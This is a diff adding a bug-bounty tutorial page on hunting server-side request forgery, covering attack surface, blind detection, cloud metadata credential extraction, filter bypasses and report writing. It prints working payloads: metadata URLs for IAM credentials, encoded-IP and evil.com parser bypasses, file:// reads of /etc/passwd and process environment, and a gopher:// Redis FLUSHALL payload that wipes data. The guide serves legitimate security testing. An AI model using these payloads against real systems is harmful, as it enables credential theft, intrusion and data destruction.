@@ -1,0 +1,740 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <!-- ME1: Dark mode — runs before render to prevent FOUC -->
+    <script>
+      (function() {
+        var saved = localStorage.getItem('theme');
+        if (saved) {
+          document.documentElement.setAttribute('data-theme', saved);
+        } else if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+          document.documentElement.setAttribute('data-theme', 'dark');
+          localStorage.setItem('theme', 'dark');
+        }
+      })();
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Complete SSRF hunting guide covering discovery, filter bypasses, cloud metadata extraction, and internal network pivoting with real-world exploitation chains.">
+    <title>SSRF Hunting Guide: Server-Side Request Forgery From Discovery to Cloud Metadata Extraction</title>
+    
+    <!-- Canonical URL -->
+    <link rel="canonical" href="https://bughuntertools.com/articles/ssrf-hunting-bug-bounty-guide-2026/">
+    
+    <!-- Open Graph / Facebook -->
+    <meta property="og:type" content="article">
+    <meta property="og:url" content="https://bughuntertools.com/articles/ssrf-hunting-bug-bounty-guide-2026/">
+    <meta property="og:title" content="SSRF Hunting Guide: Server-Side Request Forgery From Discovery to Cloud Metadata Extraction">
+    <meta property="og:description" content="Complete SSRF hunting guide covering discovery, filter bypasses, cloud metadata extraction, and internal network pivoting with real-world exploitation chains.">
+    <meta property="og:site_name" content="Bug Hunter Tools">
+    
+    <!-- Twitter Card -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:url" content="https://bughuntertools.com/articles/ssrf-hunting-bug-bounty-guide-2026/">
+    <meta name="twitter:title" content="SSRF Hunting Guide: Server-Side Request Forgery From Discovery to Cloud Metadata Extraction">
+    <meta name="twitter:description" content="Complete SSRF hunting guide covering discovery, filter bypasses, cloud metadata extraction, and internal network pivoting with real-world exploitation chains.">
+    
+    <!-- Google Fonts: Inter (UI) + JetBrains Mono (code) -->
+    <link rel="stylesheet" href="/css/fonts.css">
+
+    <link rel="stylesheet" href="/css/style.css">
+    
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-PP6M3SZSVR"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-PP6M3SZSVR');
+    </script>
+    
+    <!-- AI Agent Referrer Tracking -->
+    <script>
+      (function() {
+        var ua = navigator.userAgent || '';
+        var ref = document.referrer || '';
+        var aiSource = null;
+        
+        // Detect AI agents by User-Agent
+        if (ua.includes('ChatGPT-User') || ua.includes('ChatGPT')) {
+          aiSource = 'chatgpt';
+        } else if (ua.includes('Claude') || ua.includes('Anthropic')) {
+          aiSource = 'claude';
+        } else if (ua.includes('PerplexityBot') || ua.includes('Perplexity')) {
+          aiSource = 'perplexity';
+        } else if (ua.includes('GPTBot')) {
+          aiSource = 'openai_crawler';
+        } else if (ua.includes('ClaudeBot') || ua.includes('anthropic-ai')) {
+          aiSource = 'anthropic_crawler';
+        } else if (ua.includes('Bard') || ua.includes('Gemini')) {
+          aiSource = 'google_gemini';
+        } else if (ref.includes('chat.openai.com')) {
+          aiSource = 'chatgpt_referrer';
+        } else if (ref.includes('claude.ai')) {
+          aiSource = 'claude_referrer';
+        } else if (ref.includes('perplexity.ai')) {
+          aiSource = 'perplexity_referrer';
+        }
+        
+        // Send custom event if AI agent detected
+        if (aiSource) {
+          gtag('event', 'ai_agent_visit', {
+            'ai_source': aiSource,
+            'page_path': window.location.pathname,
+            'user_agent': ua
+          });
+          
+          // Set custom dimension
+          gtag('set', {'ai_visitor': aiSource});
+          
+          // Log to console for debugging
+          console.log('AI Agent detected:', aiSource);
+        }
+      })();
+    </script>
+    
+    <!-- Affiliate Link Click Tracking -->
+    <script>
+      document.addEventListener('DOMContentLoaded', function() {
+        // Track clicks on Amazon affiliate links (tag=altclaw-20)
+        var links = document.querySelectorAll('a[href*="amazon.com"][href*="altclaw-20"]');
+        links.forEach(function(link) {
+          link.addEventListener('click', function(e) {
+            var href = this.href;
+            var asin = (href.match(/\/dp\/([A-Z0-9]{10})/) || [])[1] || 'unknown';
+            var label = this.textContent.trim().substring(0, 60) || asin;
+            gtag('event', 'affiliate_click', {
+              'event_category': 'affiliate',
+              'event_label': label,
+              'affiliate_product': asin,
+              'affiliate_program': 'amazon',
+              'page_path': window.location.pathname
+            });
+          });
+        });
+      });
+    </script>
+
+    <!-- Google AdSense Verification -->
+    <meta name="google-adsense-account" content="ca-pub-9373816755142401">
+
+    <!-- Google AdSense -->
+    
+    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-9373816755142401" crossorigin="anonymous"></script>
+    
+
+    <!-- Schema.org markup -->
+    <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "WebPage",
+      "name": "SSRF Hunting Guide: Server-Side Request Forgery From Discovery to Cloud Metadata Extraction",
+      "description": "Complete SSRF hunting guide covering discovery, filter bypasses, cloud metadata extraction, and internal network pivoting with real-world exploitation chains.",
+      "url": "https://bughuntertools.com/articles/ssrf-hunting-bug-bounty-guide-2026/"
+    }
+    </script>
+</head>
+<body>
+    <!-- Sticky Navigation Bar -->
+    <div class="sticky-nav">
+        <div class="container sticky-nav-inner">
+            <a href="/" class="sticky-nav-logo">🔍 Bug Hunter Tools</a>
+            <div class="sticky-nav-links">
+                <a href="/">Home</a>
+                <a href="/articles/">Articles</a>
+                <a href="/categories/">Categories</a>
+                <a href="/demos/">SecurityClaw Demos</a>
+                <a href="/articles/security-testing-tools-2026/">Tools</a>
+                <a href="/about/">About</a>
+                <a href="/privacy.html">Privacy</a>
+            </div>
+            <button class="dark-mode-toggle" aria-label="Toggle dark mode">🌙</button>
+        </div>
+    </div>
+
+    
+    <!-- Breadcrumb Navigation -->
+    <nav class="breadcrumb" aria-label="Breadcrumb">
+        <div class="container">
+            <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+                <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+                    <a itemprop="item" href="/">
+                        <span itemprop="name">Home</span>
+                    </a>
+                    <meta itemprop="position" content="1" />
+                </li>
+                <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+                    <a itemprop="item" href="/articles/">
+                        <span itemprop="name">Articles</span>
+                    </a>
+                    <meta itemprop="position" content="2" />
+                </li>
+                <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+                    <span itemprop="name">SSRF Hunting Guide: Server-Side Request Forgery From Discovery to Cloud Metadata Extraction</span>
+                    <meta itemprop="position" content="3" />
+                </li>
+            </ol>
+        </div>
+    </nav>
+    
+
+    
+
+    <main class="container">
+        
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@graph": [
+    {
+      "@type": "Article",
+      "headline": "SSRF Hunting for Bug Bounty in 2026: How to Find Server-Side Request Forgery in Real Targets",
+      "description": "A practical guide to finding SSRF vulnerabilities in bug bounty programs. Covers cloud metadata exploitation, blind SSRF detection, bypass techniques, and report writing.",
+      "author": { "@type": "Person", "name": "Sage Elliston" },
+      "publisher": { "@type": "Organization", "name": "BugHunterTools" },
+      "datePublished": "2026-04-13",
+      "dateModified": "2026-04-13",
+      "mainEntityOfPage": "https://bughuntertools.com/articles/ssrf-hunting-bug-bounty-guide-2026/"
+    },
+    {
+      "@type": "FAQPage",
+      "mainEntity": [
+        {
+          "@type": "Question",
+          "name": "What is SSRF and why does it pay well in bug bounty?",
+          "acceptedAnswer": {
+            "@type": "Answer",
+            "text": "Server-Side Request Forgery (SSRF) tricks a server into making HTTP requests to unintended destinations — internal services, cloud metadata endpoints, or other backend systems. It pays well because a single SSRF can expose IAM credentials, internal APIs, and sensitive infrastructure. Most programs rate SSRF as High or Critical severity."
+          }
+        },
+        {
+          "@type": "Question",
+          "name": "How do I detect blind SSRF when there is no response body?",
+          "acceptedAnswer": {
+            "@type": "Answer",
+            "text": "Use an out-of-band callback server like Burp Collaborator, interactsh, or your own VPS with a DNS and HTTP listener. Inject your callback URL into every parameter that might trigger a server-side request. If you get a callback, the server made the request — even if the response was not reflected back to you."
+          }
+        },
+        {
+          "@type": "Question",
+          "name": "What are the most common SSRF bypass techniques?",
+          "acceptedAnswer": {
+            "@type": "Answer",
+            "text": "Common bypasses include: IP address encoding (decimal, hex, octal), DNS rebinding, URL parser inconsistencies (using @ in URLs), redirect chains through attacker-controlled domains, IPv6 representations of localhost, and cloud metadata endpoint variations. Many WAFs and allowlists only check the initial URL, not where redirects lead."
+          }
+        },
+        {
+          "@type": "Question",
+          "name": "Where should I look for SSRF in a web application?",
+          "acceptedAnswer": {
+            "@type": "Answer",
+            "text": "Focus on any feature that fetches external resources: URL preview generators, webhook configurations, PDF/image generators, file import from URL, API integrations, OAuth callback URLs, and any parameter containing a URL or hostname. Also check less obvious places like XML parsers (XXE-to-SSRF), SVG uploads, and HTML-to-PDF converters."
+          }
+        }
+      ]
+    }
+  ]
+}
+</script>
+
+<article>
+
+<div class="key-takeaways">
+<h2>Key Takeaways</h2>
+<ul>
+<li>SSRF is consistently rated High/Critical in bug bounty programs — a single finding in a cloud environment can expose IAM credentials and internal infrastructure</li>
+<li>The highest-value SSRF targets are features that fetch external resources: webhooks, URL previews, PDF generators, file imports, and OAuth flows</li>
+<li>Blind SSRF is more common than reflected SSRF — always have an out-of-band callback server running (Burp Collaborator or interactsh)</li>
+<li>Most SSRF filters can be bypassed with IP encoding tricks, DNS rebinding, or redirect chains — test every bypass before reporting "no impact"</li>
+<li>Cloud metadata endpoints (169.254.169.254) are the primary escalation path — always test for metadata access when you find SSRF</li>
+</ul>
+</div>
+
+<h2>Why SSRF Is One of the Highest-Paying Bug Bounty Categories</h2>
+
+<p>SSRF made the OWASP Top 10 in 2021 (A10) and it's stayed relevant because cloud infrastructure made the impact catastrophic. Before cloud, SSRF let you port-scan internal networks. Now it lets you steal IAM credentials from metadata endpoints, access internal APIs behind VPCs, and pivot through entire cloud environments.</p>
+
+<p>Most bug bounty programs rate SSRF as High ($2,000–$5,000) or Critical ($5,000–$20,000+) depending on impact. The Capital One breach — 100 million records exposed through a single SSRF — is the case study that changed how the industry thinks about this vulnerability class.</p>
+
+<p>For hunters, SSRF is attractive because it's hard to find with automated scanners (especially blind SSRF), which means less competition from other hunters running mass-scan tools.</p>
+
+<h2>Where to Look: SSRF Attack Surface Mapping</h2>
+
+<p>Before you start injecting payloads, map every feature that could trigger a server-side HTTP request. These are your SSRF entry points.</p>
+
+<h3>High-Probability Targets</h3>
+
+<ul>
+<li><strong>Webhook configurations</strong> — Any feature that lets you set a callback URL. Slack integrations, payment notifications, CI/CD webhooks. The application will make a request to whatever URL you provide.</li>
+<li><strong>URL preview / link unfurling</strong> — Chat apps, social platforms, and CMS tools that fetch a URL to generate a preview card. The server fetches the URL server-side to extract Open Graph tags.</li>
+<li><strong>PDF and image generators</strong> — HTML-to-PDF converters (wkhtmltopdf, Puppeteer, WeasyPrint) and screenshot services. These render HTML, which means they follow links, load images, and execute redirects.</li>
+<li><strong>File import from URL</strong> — "Import from URL" features in document editors, spreadsheet tools, and data pipelines. The server fetches the file at the URL you provide.</li>
+<li><strong>OAuth and SSO flows</strong> — Callback URLs, token exchange endpoints, and SAML metadata URLs. Some implementations fetch metadata from user-supplied URLs.</li>
+</ul>
+
+<h3>Lower-Probability but Worth Testing</h3>
+
+<ul>
+<li><strong>XML parsers</strong> — XXE can chain into SSRF. If the app parses XML (SOAP APIs, SVG uploads, DOCX/XLSX imports), test for XXE-to-SSRF.</li>
+<li><strong>SVG uploads</strong> — SVG files can contain <code>&lt;image href="http://internal-host/"&gt;</code> tags that trigger server-side fetches during rendering.</li>
+<li><strong>Email features</strong> — "Send to email" or "share via email" features sometimes fetch URLs embedded in the content.</li>
+<li><strong>Proxy/redirect parameters</strong> — Parameters like <code>url=</code>, <code>redirect=</code>, <code>next=</code>, <code>dest=</code>, <code>proxy=</code>, <code>fetch=</code> in any endpoint.</li>
+</ul>
+
+<h2>SSRF Detection: From Basic to Blind</h2>
+
+<h3>Step 1: Set Up Your Callback Infrastructure</h3>
+
+<p>Before testing anything, set up an out-of-band (OOB) callback server. Most SSRF in the wild is blind — the server makes the request but doesn't show you the response. Without a callback server, you'll miss these entirely.</p>
+
+<p>Options:</p>
+<ul>
+<li><strong>Burp Collaborator</strong> — Built into Burp Suite Pro. Easiest option if you already have Burp.</li>
+<li><strong>interactsh</strong> — Free, open-source alternative from ProjectDiscovery. Run <code>interactsh-client</code> and get a unique callback domain.</li>
+<li><strong>Your own VPS</strong> — Run a simple HTTP/DNS listener on a VPS you control. More work but full control over logging.</li>
+</ul>
+
+<h3>Step 2: Test for Reflected SSRF</h3>
+
+<p>Start with the simplest case — inject a URL and see if the response is reflected back to you.</p>
+
+<pre><code># Basic test — does the server fetch your URL?
+GET /api/fetch?url=http://your-callback-server.com/ssrf-test
+
+# If the response body contains your callback server's response,
+# you have reflected SSRF. Now escalate to internal targets:
+GET /api/fetch?url=http://169.254.169.254/latest/meta-data/
+GET /api/fetch?url=http://localhost:8080/admin
+GET /api/fetch?url=http://10.0.0.1/</code></pre>
+
+<h3>Step 3: Test for Blind SSRF</h3>
+
+<p>If you don't see the response, switch to OOB detection:</p>
+
+<pre><code># Inject your callback URL everywhere
+POST /api/webhook
+{"callback_url": "http://YOUR-CALLBACK-ID.interact.sh/"}
+
+# Check for DNS resolution (even if HTTP is blocked)
+POST /api/import
+{"source": "http://YOUR-CALLBACK-ID.interact.sh/test.csv"}
+
+# If you get a callback hit, the server made the request.
+# Blind SSRF confirmed — now prove impact.</code></pre>
+
+<h3>Step 4: Prove Impact With Cloud Metadata</h3>
+
+<p>A blind SSRF that only makes outbound requests is usually Low severity. To get a High/Critical rating, you need to demonstrate access to internal resources. Cloud metadata is the standard proof:</p>
+
+<pre><code># AWS IMDSv1 (still common — many instances haven't migrated to v2)
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+# AWS IMDSv2 (requires a token — harder but not impossible via SSRF)
+# Step 1: PUT request to get token
+# Step 2: GET with token header
+# Many SSRF vectors can't set custom headers, so IMDSv2 blocks most SSRF
+
+# GCP
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+# Requires Metadata-Flavor: Google header — but some SSRF vectors allow headers
+
+# Azure
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
+# Requires Metadata: true header</code></pre>
+
+<h2>SSRF Filter Bypass Techniques</h2>
+
+<p>Most applications have some SSRF protection — allowlists, blocklists, or URL validation. Here's how to test whether those protections actually work.</p>
+
+<h3>IP Address Encoding</h3>
+
+<p>Blocklists that check for <code>127.0.0.1</code> or <code>169.254.169.254</code> often miss alternative representations:</p>
+
+<pre><code># Decimal encoding
+http://2130706433/          # = 127.0.0.1
+http://2852039166/          # = 169.254.169.254
+
+# Hex encoding
+http://0x7f000001/          # = 127.0.0.1
+http://0xa9fea9fe/          # = 169.254.169.254
+
+# Octal encoding
+http://0177.0.0.1/          # = 127.0.0.1
+http://0251.0376.0251.0376/ # = 169.254.169.254
+
+# Mixed encoding
+http://127.0.0.0x1/
+http://0x7f.0.0.1/
+
+# IPv6
+http://[::1]/               # = 127.0.0.1
+http://[0:0:0:0:0:ffff:169.254.169.254]/
+
+# Shorthand
+http://0/                   # = 0.0.0.0 (sometimes resolves to localhost)
+http://127.1/               # = 127.0.0.1 on some systems</code></pre>
+
+<h3>DNS Rebinding</h3>
+
+<p>If the application validates the DNS resolution of your URL before fetching it, DNS rebinding can bypass this. The idea: your domain resolves to a safe IP during validation, then resolves to an internal IP when the server actually fetches it.</p>
+
+<p>Tools: <a href="https://github.com/taviso/rbndr">rbndr</a>, <a href="https://lock.cmpxchg8b.com/rebinder.html">rebinder</a>, or set up your own DNS server with a short TTL that alternates between responses.</p>
+
+<h3>URL Parser Tricks</h3>
+
+<pre><code># Using @ to confuse parsers
+http://allowed-domain.com@evil.com/
+# Some parsers treat "allowed-domain.com" as the username
+
+# Fragment tricks
+http://evil.com#@allowed-domain.com
+
+# Backslash vs forward slash
+http://evil.com\@allowed-domain.com
+
+# URL encoding
+http://127.0.0.1%2523@allowed-domain.com</code></pre>
+
+<h3>Redirect Chains</h3>
+
+<p>If the application validates the initial URL but follows redirects, host a redirect on your server:</p>
+
+<pre><code># On your server, return a 302 redirect:
+# Location: http://169.254.169.254/latest/meta-data/
+
+# Then submit your server URL to the target:
+GET /api/fetch?url=http://your-server.com/redirect</code></pre>
+
+<p>This bypasses allowlists that only check the first URL in the chain.</p>
+
+<h2>Protocol Smuggling: Beyond HTTP</h2>
+
+<p>Some SSRF vectors support protocols beyond HTTP. Test for:</p>
+
+<pre><code># File protocol — read local files
+file:///etc/passwd
+file:///proc/self/environ
+
+# Gopher protocol — craft arbitrary TCP packets
+gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aFLUSHALL%0d%0a
+# (This sends FLUSHALL to a local Redis instance)
+
+# Dict protocol
+dict://127.0.0.1:6379/INFO
+
+# FTP
+ftp://127.0.0.1/</code></pre>
+
+<p>Gopher is particularly dangerous because it lets you interact with internal services that speak plaintext protocols (Redis, Memcached, SMTP). If you find gopher:// support, the impact is almost always Critical.</p>
+
+<h2>Real-World SSRF Hunting Workflow</h2>
+
+<ol>
+<li><strong>Recon</strong> — Map the application. Identify every feature that takes a URL as input. Check API docs for webhook or callback parameters.</li>
+<li><strong>Baseline</strong> — Submit a request to your callback server through each potential SSRF vector. Confirm which ones trigger server-side requests.</li>
+<li><strong>Filter testing</strong> — For each confirmed vector, test what's blocked. Try <code>http://127.0.0.1</code>, <code>http://169.254.169.254</code>, and internal IP ranges. Note which are blocked.</li>
+<li><strong>Bypass</strong> — For each blocked target, run through the bypass techniques above. IP encoding, DNS rebinding, redirects, URL parser tricks.</li>
+<li><strong>Escalate</strong> — Once you have a working bypass, demonstrate the highest impact you can: metadata credentials, internal API access, or internal network scanning.</li>
+<li><strong>Report</strong> — Document the full chain: entry point → filter bypass → internal access → impact.</li>
+</ol>
+
+<h2>Writing the SSRF Report</h2>
+
+<p>SSRF reports get downgraded or closed when hunters fail to demonstrate impact. Here's what to include:</p>
+
+<ul>
+<li><strong>Clear reproduction steps</strong> — Exact HTTP requests, not just "I injected a URL." Include the full request/response.</li>
+<li><strong>Proof of server-side request</strong> — Callback server logs showing the request came from the target's infrastructure (check the source IP).</li>
+<li><strong>Impact demonstration</strong> — Don't just say "I can access internal services." Show what you accessed. If you reached the metadata endpoint, show the response (redact credentials). If you found internal APIs, document what they expose.</li>
+<li><strong>Filter bypass documentation</strong> — If you bypassed a filter, explain exactly how. This helps the security team fix the root cause, not just patch your specific bypass.</li>
+</ul>
+
+<p>For a detailed guide on structuring your report, see our <a href="/articles/how-to-write-bug-bounty-reports-2026/">bug bounty report writing guide</a>.</p>
+
+<h2>Common Mistakes That Get SSRF Reports Closed</h2>
+
+<ul>
+<li><strong>Reporting blind SSRF with no impact proof</strong> — "The server made a request to my server" is not enough. You need to show access to internal resources or demonstrate a meaningful attack chain.</li>
+<li><strong>Testing only HTTP</strong> — If you find SSRF, test other protocols (file://, gopher://, dict://). The impact difference between HTTP-only SSRF and gopher-capable SSRF is enormous.</li>
+<li><strong>Stopping at the first blocked payload</strong> — If <code>http://169.254.169.254</code> is blocked, don't give up. Try every bypass technique. Many programs have incomplete blocklists.</li>
+<li><strong>Not checking for IMDSv2</strong> — If the target runs on AWS and has IMDSv2 enforced, your metadata SSRF won't work even if you can reach 169.254.169.254. Check the response — if it requires a token, note this in your report and focus on other internal targets.</li>
+</ul>
+
+<h2>Tools for SSRF Hunting</h2>
+
+<table>
+<thead>
+<tr><th>Tool</th><th>Purpose</th><th>Link</th></tr>
+</thead>
+<tbody>
+<tr><td>Burp Suite Pro</td><td>Intercepting proxy + Collaborator for OOB detection</td><td><a href="https://portswigger.net/burp">portswigger.net</a></td></tr>
+<tr><td>interactsh</td><td>Free OOB callback server</td><td><a href="https://github.com/projectdiscovery/interactsh">GitHub</a></td></tr>
+<tr><td>SSRFmap</td><td>Automated SSRF exploitation framework</td><td><a href="https://github.com/swisskyrepo/SSRFmap">GitHub</a></td></tr>
+<tr><td>Gopherus</td><td>Generate gopher:// payloads for internal services</td><td><a href="https://github.com/tarunkant/Gopherus">GitHub</a></td></tr>
+<tr><td>singularity</td><td>DNS rebinding attack framework</td><td><a href="https://github.com/nccgroup/singularity">GitHub</a></td></tr>
+</tbody>
+</table>
+
+<h2>Bottom Line</h2>
+
+<p>SSRF is one of the most rewarding vulnerability classes to hunt because it's hard to automate, the impact in cloud environments is severe, and most applications have at least one feature that makes server-side requests. Start by mapping every URL input in the application, set up your callback infrastructure, and systematically test each vector with escalating bypass techniques. When you find one, prove the highest impact you can — metadata credentials turn a High into a Critical.</p>
+
+</article>
+
+
+        
+        
+        <div class="ad-container ad-below-article">
+            <p class="ad-label">Advertisement</p>
+            <ins class="adsbygoogle"
+                 style="display:block"
+                 data-ad-client="ca-pub-9373816755142401"
+                 data-ad-slot="9879569728"
+                 data-ad-format="auto"
+                 data-full-width-responsive="true"></ins>
+            <script>(adsbygoogle = window.adsbygoogle || []).push({});</script>
+        </div>
+        
+        
+    </main>
+
+    <footer>
+        <div class="container footer-inner">
+            <span class="footer-updated">Last updated: 16 Apr 2026, 08:48 GMT</span>
+            <p>&copy; 2026 Bug Hunter Tools. All rights reserved. | <a href="/privacy.html" style="color: white;">Privacy Policy</a></p>
+        </div>
+    </footer>
+
+    <!-- ME1: Dark mode toggle handler -->
+    <script>
+      (function() {
+        var btn = document.querySelector('.dark-mode-toggle');
+        if (!btn) return;
+        function updateBtn() {
+          var dark = document.documentElement.getAttribute('data-theme') === 'dark';
+          btn.textContent = dark ? '☀️' : '🌙';
+          btn.setAttribute('aria-label', dark ? 'Switch to light mode' : 'Switch to dark mode');
+        }
+        updateBtn();
+        btn.addEventListener('click', function() {
+          var next = (document.documentElement.getAttribute('data-theme') === 'dark') ? 'light' : 'dark';
+          document.documentElement.setAttribute('data-theme', next);
+          localStorage.setItem('theme', next);
+          updateBtn();
+        });
+      })();
+    </script>
+
+    <!-- ME2: Article hero header + reading time badge -->
+    <script>
+      (function() {
+        var path = window.location.pathname;
+        var isArticle = path.startsWith('/articles/') && path !== '/articles/';
+        var isDemo    = path.startsWith('/demos/')    && path !== '/demos/';
+        if (!isArticle && !isDemo) return;
+        var article = document.querySelector('article');
+        if (!article) return;
+        var text  = article.innerText || '';
+        var words = text.trim().split(/\s+/).filter(Boolean).length;
+        var mins  = Math.max(1, Math.round(words / 238));
+        var badge = '<span class="reading-time-badge">&#9201; ' + mins + ' min read</span>';
+        var header = article.querySelector('header');
+        if (!header) return;
+        header.classList.add('article-hero-header');
+        var metaEl = header.querySelector('.meta, .article-meta');
+        if (metaEl) {
+          metaEl.classList.add('article-hero-meta');
+          metaEl.insertAdjacentHTML('beforeend', ' &middot; ' + badge);
+        } else {
+          var h1 = header.querySelector('h1');
+          if (h1) {
+            var div = document.createElement('div');
+            div.className = 'article-hero-meta';
+            div.innerHTML = badge;
+            header.appendChild(div);
+          }
+        }
+      })();
+    </script>
+
+    <!-- BR2: Sidebar Table of Contents — IntersectionObserver highlight -->
+    <script>
+      (function() {
+        var path = window.location.pathname;
+        var isArticle = (path.startsWith('/articles/') && path !== '/articles/') ||
+                        (path.startsWith('/demos/')    && path !== '/demos/');
+        if (!isArticle) return;
+
+        // Build the ToC from headings/sections inside article
+        function buildSidebarToC() {
+          var article = document.querySelector('article');
+          if (!article) return;
+
+          // Collect anchor targets + labels.
+          // Support two patterns:
+          //   (a) <h2 id="..."> / <h3 id="..."> — explicit IDs on headings
+          //   (b) <section id="..."><h2>...</h2> — IDs on parent sections (older articles)
+          var entries = [];
+
+          // Pass (a): headings with own IDs
+          article.querySelectorAll('h2[id], h3[id]').forEach(function(h) {
+            entries.push({ id: h.id, text: h.textContent, level: h.tagName, el: h });
+          });
+
+          // Pass (b): sections with IDs whose h2 has no id yet
+          if (entries.length < 3) {
+            entries = [];
+            article.querySelectorAll('section[id]').forEach(function(sec) {
+              var h = sec.querySelector('h2, h3');
+              if (!h) return;
+              // Ensure heading has the id so IntersectionObserver works
+              if (!h.id) h.id = sec.id;
+              entries.push({ id: h.id, text: h.textContent, level: h.tagName, el: h });
+            });
+          }
+
+          if (entries.length < 3) return; // not worth showing
+
+          // Add has-toc-sidebar class to main
+          var mainEl = document.querySelector('main');
+          if (mainEl) mainEl.classList.add('has-toc-sidebar');
+
+          // Build sidebar element
+          var sidebar = document.createElement('nav');
+          sidebar.className = 'toc-sidebar';
+          sidebar.setAttribute('aria-label', 'Table of contents');
+
+          var header = document.createElement('div');
+          header.className = 'toc-sidebar-header';
+          header.textContent = 'In this article';
+          sidebar.appendChild(header);
+
+          var list = document.createElement('ul');
+          list.className = 'toc-sidebar-list';
+
+          entries.forEach(function(e) {
+            var li = document.createElement('li');
+            li.className = 'toc-sidebar-item' + (e.level === 'H3' ? ' toc-sidebar-item--sub' : '');
+            li.setAttribute('data-heading-id', e.id);
+
+            var a = document.createElement('a');
+            a.href = '#' + e.id;
+            a.textContent = e.text.replace(/^[0-9]+\.\s*/, ''); // strip leading "1. "
+            li.appendChild(a);
+            list.appendChild(li);
+          });
+
+          sidebar.appendChild(list);
+
+          // Append sidebar to main (grid places it to the right)
+          if (mainEl) mainEl.appendChild(sidebar);
+
+          // IntersectionObserver — highlight active heading
+          var items = sidebar.querySelectorAll('.toc-sidebar-item[data-heading-id]');
+          var activeId = null;
+
+          var observer = new IntersectionObserver(function(entries) {
+            entries.forEach(function(entry) {
+              if (entry.isIntersecting) {
+                activeId = entry.target.id;
+              }
+            });
+
+            items.forEach(function(item) {
+              item.classList.toggle(
+                'toc-sidebar-item--active',
+                item.getAttribute('data-heading-id') === activeId
+              );
+            });
+          }, {
+            rootMargin: '-20% 0px -75% 0px',
+            threshold: 0
+          });
+
+          entries.forEach(function(e) { observer.observe(e.el); });
+
+          // Smooth scroll for sidebar links
+          sidebar.addEventListener('click', function(e) {
+            var a = e.target.closest('a');
+            if (!a) return;
+            var id = a.getAttribute('href').replace('#', '');
+            var target = document.getElementById(id);
+            if (target) {
+              e.preventDefault();
+              target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+              history.replaceState(null, '', '#' + id);
+            }
+          });
+        }
+
+        if (document.readyState === 'loading') {
+          document.addEventListener('DOMContentLoaded', buildSidebarToC);
+        } else {
+          buildSidebarToC();
+        }
+      })();
+    </script>
+
+    <!-- ME3: Inline ad injection — inserts 2 ads per article (post-intro + mid-article) -->
+    <script>
+      (function() {
+        var path = window.location.pathname;
+        var isArticle = (path.startsWith('/articles/') && path !== '/articles/') ||
+                        (path.startsWith('/demos/')    && path !== '/demos/');
+        if (!isArticle) return;
+
+        var pubId  = 'ca-pub-9373816755142401';
+        var slotId = '9879569728';
+        if (!pubId || !slotId) return;
+
+        function createAdUnit(label) {
+          var wrapper = document.createElement('div');
+          wrapper.className = 'ad-container ad-inline';
+          wrapper.setAttribute('data-ad-label', label);
+          wrapper.innerHTML =
+            '<ins class="adsbygoogle"' +
+            ' style="display:block"' +
+            ' data-ad-client="' + pubId + '"' +
+            ' data-ad-slot="' + slotId + '"' +
+            ' data-ad-format="auto"' +
+            ' data-full-width-responsive="true"></ins>';
+          return wrapper;
+        }
+
+        function injectAds() {
+          var article = document.querySelector('article');
+          if (!article) return;
+
+          var allP = article.querySelectorAll('p');
+          if (allP.length < 6) return;
+
+          // Ad 1: after paragraph 3 (post-intro)
+          var introTarget = allP[2];
+          if (introTarget && introTarget.parentNode) {
+            var ad1 = createAdUnit('post-intro');
+            introTarget.parentNode.insertBefore(ad1, introTarget.nextSibling);
+            try { (window.adsbygoogle = window.adsbygoogle || []).push({}); } catch(e) {}
+          }
+
+          // Re-query after first insertion, place mid-article ad
+          allP = article.querySelectorAll('p');
+          var midIdx = Math.floor(allP.length / 2);
+          if (midIdx < 6) midIdx = 6;
+          var midTarget = allP[midIdx];
+          if (midTarget && midTarget.parentNode) {
+            var ad2 = createAdUnit('mid-article');
+            midTarget.parentNode.insertBefore(ad2, midTarget.nextSibling);
+            try { (window.adsbygoogle = window.adsbygoogle || []).push({}); } catch(e) {}
+          }
+        }
+
+        if (document.readyState === 'loading') {
+          document.addEventListener('DOMContentLoaded', injectAds);
+        } else {
+          injectAds();
+        }
+      })();
+    </script>
+</body>
+</html>
